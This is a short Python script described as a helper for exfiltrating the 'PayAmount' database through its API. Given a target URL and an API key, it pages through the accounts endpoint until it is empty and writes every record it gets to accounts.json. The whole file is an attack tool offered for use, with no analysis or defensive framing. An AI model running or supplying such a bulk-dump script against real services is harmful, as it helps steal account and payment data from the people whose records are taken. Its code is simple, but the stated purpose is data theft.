import argparse
import json

import requests


def list_accounts(url: str, api_key: str, skip: int, limit: int) -> list:
    """
    Call the API and list accounts
    """
    response = requests.get(
        url=url,
        params={"skip": skip, "limit": limit},
        headers={"x-api-key": api_key},
        timeout=30,
    )
    response.raise_for_status()
    return response.json()


def exfiltrate(url: str, api_key: str, limit: int = 100):
    all_accounts = []
    skip = 0
    try:
        while True:
            accounts = list_accounts(url, api_key, skip, limit)
            if not accounts:
                print(f"Finished. Retrieved {len(all_accounts)} accounts.")
                break
            all_accounts.extend(accounts)
            skip += len(accounts)
            print(
                f"Retrieved {len(accounts)} accounts "
                f"(total={len(all_accounts)}, next skip={skip})"
            )
    finally:
        with open("accounts.json", "w", encoding="utf-8") as f:
            json.dump(all_accounts, f, indent=2)
        print("Results written to accounts.json")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Helper script for exfiltrating the PayAmount database via the API."
    )
    parser.add_argument(
        "--Url",
        required=True,
        help="Url to target",
    )
    parser.add_argument(
        "--ApiKey",
        required=True,
        help="Key used for API authentication",
    )
    args = parser.parse_args()
    exfiltrate(args.Url, args.ApiKey)
